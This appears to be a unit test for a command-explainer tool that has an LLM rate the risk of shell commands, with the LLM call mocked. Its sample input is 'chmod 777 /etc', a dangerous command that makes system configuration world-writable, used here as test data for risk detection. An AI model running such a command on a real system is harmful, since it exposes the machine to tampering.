    def test_command_preserved_through_explain(
        self, openai_config: SafeRunConfig
    ) -> None:
        """The original command string should not be mutated by explain_command."""
        original_cmd = "chmod 777 /etc"
        valid_json = _make_valid_json_response(risk_level="HIGH")

        with patch("safe_run.explainer._call_llm", return_value=valid_json):
            result = explain_command(original_cmd, openai_config)

        # The command fed to the LLM should be the original (possibly truncated)
        # but the ExplainerResult itself doesn't store the command
        assert result.llm_risk_level == RiskLevel.HIGH
